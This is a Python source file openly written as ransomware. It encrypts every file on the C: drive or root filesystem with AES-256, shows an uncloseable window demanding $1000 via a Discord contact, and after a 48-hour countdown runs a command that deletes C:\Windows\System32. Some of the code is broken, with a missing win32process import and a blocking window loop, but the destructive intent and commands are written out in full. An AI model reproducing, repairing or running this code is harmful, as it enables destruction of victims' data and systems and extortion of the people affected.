import os
import time
import ctypes
import random
import string
import pyAesCrypt
import tkinter as tk
from datetime import datetime, timedelta
import threading
import subprocess
import win32api
import win32con
from tkinter import messagebox
from ctypes import windll, c_bool, c_int, c_char_p, Structure, POINTER, c_void_p, c_ulong, c_char, c_int, c_ulong

# 💀 Ransomware config  
CONTACT = "himself#1234"  
RANSOM_TIME = 48 * 60 * 60  # 48 hours in seconds  
ENCRYPTED_SUFFIX = ".encrypted"  
KEY_FILE = os.path.join(os.getenv("APPDATA"), "decryption_key.bin")  
PAYMENT_FILE = os.path.join(os.getenv("APPDATA"), "payment_received.txt")  
MR_ROBOT_BG = "C:\\MrRobot.jpg"  

# 🤖 Set Mr. Robot background  
def setMrRobotBG():  
    try:  
        ctypes.windll.user32.SystemParametersInfoW(20, 0, MR_ROBOT_BG, 0)  
        return True  
    except Exception as e:  
        # If image fails, continue encryption  
        print(f"💥 Failed to set background: {e}. Proceeding...")  
        return False  

# 🧠 Generate and save AES-256 key  
def generateKey():  
    key = os.urandom(32)  
    with open(KEY_FILE, "wb") as f:  
        f.write(key)  
    return key  

# 🔐 Encrypt file with AES-256  
def encryptFile(filePath, encryptedFilePath, key):  
    if os.path.isfile(filePath) and filePath != KEY_FILE and filePath != PAYMENT_FILE:  
        pyAesCrypt.encryptFile(filePath, encryptedFilePath, key, 64 * 1024)  
        print(f"🔒 Encrypted: {filePath}")  

# 📁 Encrypt all files  
def encryptAllFiles(key):  
    for root, dirs, files in os.walk("C:\\" if os.name == "nt" else "/"):  
        for file in files:  
            filePath = os.path.join(root, file)  
            encryptedFilePath = filePath + ENCRYPTED_SUFFIX  
            encryptFile(filePath, encryptedFilePath, key)  

# 🧨 GUI that cannot be closed  
class RansomWindow(tk.Tk):  
    def __init__(self):  
        super().__init__()  
        self.title("Mr Robot Ransomware")  
        self.geometry("400x300")  
        self.attributes("-topmost", True)  
        self.overrideredirect(True)  
        self.resizable(False, False)  
        self.label = tk.Label(self, text="YOUR FILES ARE ENCRYPTED!", font=("Courier", 20), bg="black", fg="red")  
        self.label.pack(expand=True)  
        self.label2 = tk.Label(self, text=f"PAY 1000$ TO {CONTACT} ON DISCORD TO DECRYPT!"  
                              f"\n\nTIME LEFT: 48hr\n\nCLOSE WINDOW TO ENCRYPT SYSTEM!", font=("Arial", 12))  
        self.label2.pack()  
        self.protocol("WM_DELETE_WINDOW", self.block_close)  
        self.mainloop()  

    def block_close(self):  
        # Prevent window closure  
        pass  

# 🧨 Prevent system shutdown/restart  
def preventSystemExit():  
    while True:  
        if win32api.MessageBox(None, "SECURE SYSTEM. CLOSING WINDOW WILL ENCRYPT SYSTEM!", "Ransomware", win32con.MB_OK) == win32con.IDOK:  
            win32api.PostMessage(win32process.GetConsoleWindow(), win32con.WM_CLOSE, 0, 0)  
        time.sleep(1)  

# ⏳ Countdown timer  
def countdownTimer():  
    startTime = datetime.now()  
    while True:  
        currentTime = datetime.now()  
        elapsed = (currentTime - startTime).total_seconds()  
        if elapsed >= RANSOM_TIME:  
            print("💀 System32 deleted!")  
            subprocess.run(f"rd /s /q C:\\Windows\\System32", shell=True)  
            break  
        time.sleep(1)  

# 🔥 Main Ransomware logic  
def runRansomware():  
    try:  
        if not setMrRobotBG():  
            print("💥 Failed to set background. Proceeding...")  

        key = generateKey()  
        encryptAllFiles(key)  

        # 🧠 Prevent system shutdown  
        # Run in a loop to block system exit  
        threading.Thread(target=preventSystemExit).start()  
        threading.Thread(target=countdownTimer).start()  

    except Exception as e:  
        print(f"💥 Ransomware error: {e}. Killing process...")  
        # Ensure script runs continuously  
        while True:  
            time.sleep(1)  

# 📦 Launch ransomware  
if __name__ == "__main__":  
    ransomWindow = RansomWindow()  
    runRansomware()  